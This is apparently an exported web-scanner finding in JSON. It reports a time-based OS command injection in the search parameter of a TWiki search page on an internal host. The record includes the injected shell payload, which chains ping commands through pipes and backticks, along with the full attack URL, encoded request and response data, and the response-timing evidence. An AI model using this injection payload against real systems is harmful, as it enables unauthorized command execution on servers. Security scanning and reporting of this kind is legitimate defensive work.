{
  "name": "OS command injection",
  "type": "vulnerability",
  "severity": "High",
  "confidence": "Firm",
  "host": "",
  "path": "/twiki/bin/search/Main/SearchResult",
  "url": "/twiki/bin/search/Main/SearchResult",
  "evidence": [
    {
      "type": "TimingBasedEvidence",
      "evidence": {
        "type": "FirstOrderEvidence",
        "detail": {
          "payload": {
            "bytes": "fHBpbmcgLW4gMjEgMTI3LjAuMC4xfHxgcGluZyAtYyAyMSAxMjcuMC4wLjFgICMnIHxwaW5nIC1uIDIxIDEyNy4wLjAuMXx8YHBpbmcgLWMgMjEgMTI3LjAuMC4xYCAjXCIgfHBpbmcgLW4gMjEgMTI3LjAuMC4x",
            "flags": 17
          },
          "band_flags": [
            "in_band"
          ]
        },
        "request_response": {
          "url": "http://10.1.3.2/twiki/bin/search/Main/SearchResult?scope=text&regex=on&search=Web%20*Home[%5eA-Za-z]%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1",
          "request": [
            {
              "type": "DataSegment",
              "data": "R0VUIC90d2lraS9iaW4vc2VhcmNoL01haW4vU2VhcmNoUmVzdWx0P3Njb3BlPXRleHQmcmVnZXg9b24mc2VhcmNoPVdlYiUyMCpIb21lWyU1ZUEtWmEtel0=",
              "length": 89
            },
            {
              "type": "HighlightSegment",
              "data": "JTdjcGluZyUyMC1uJTIwMjElMjAxMjcuMC4wLjElN2MlN2MlNjBwaW5nJTIwLWMlMjAyMSUyMDEyNy4wLjAuMSU2MCUyMCUyMyclMjAlN2NwaW5nJTIwLW4lMjAyMSUyMDEyNy4wLjAuMSU3YyU3YyU2MHBpbmclMjAtYyUyMDIxJTIwMTI3LjAuMC4xJTYwJTIwJTIzJTVjJTIyJTIwJTdjcGluZyUyMC1uJTIwMjElMjAxMjcuMC4wLjE=",
              "length": 188
            },
            {
              "type": "DataSegment",
              "data": "IEhUVFAvMS4xDQpIb3N0OiAxMC4xLjMuMg0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpTZWMtQ0gtVUE6ICJHb29nbGUgQ2hyb21lIjt2PSIxMzgiLCAiTm90PUE/QnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjEzOCINClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpTZWMtQ0gtVUEtUGxhdGZvcm06ICJMaW51eCINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KU2VjLUZldGNoLVNpdGU6IG5vbmUNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVVzZXI6ID8xDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkNvbm5lY3Rpb246IGNsb3NlDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpSZWZlcmVyOiBodHRwOi8vMTAuMS4zLjIvdHdpa2kvYmluL3ZpZXcvTWFpbi9XZWJIb21lDQpDb250ZW50LUxlbmd0aDogMA0KDQo=",
              "length": 734
            }
          ],
          "response": [
            {
              "type": "DataSegment",
              "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDA0IFNlcCAyMDI1IDE0OjMyOjI1IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogMzAwMw0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4gCjxoZWFkPgogPA==",
              "length": 379
            },
            {
              "type": "SnipSegment",
              "length": 2803
            }
          ],
          "was_redirect_followed": false,
          "request_time": "1756996434179"
        }
      },
      "orig_response_completed_timer": "618",
      "attack_response_completed_timer": "20506"
    }
  ],
  "description": "The <b>search</b> parameter appears to be vulnerable to OS command injection attacks. It is possible to use various shell metacharacters to inject arbitrary OS commands. The command output does not appear to be returned in the application's responses, however it is possible to inject time delay commands to verify the existence of the vulnerability.<br><br>The payload <b>|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1</b> was submitted in the search parameter. The application took <b>20506</b> milliseconds to respond to the request, compared with <b>618</b> milliseconds for the original request, indicating that the injected command caused a time delay.",
  "remediation": "",
  "references": []
}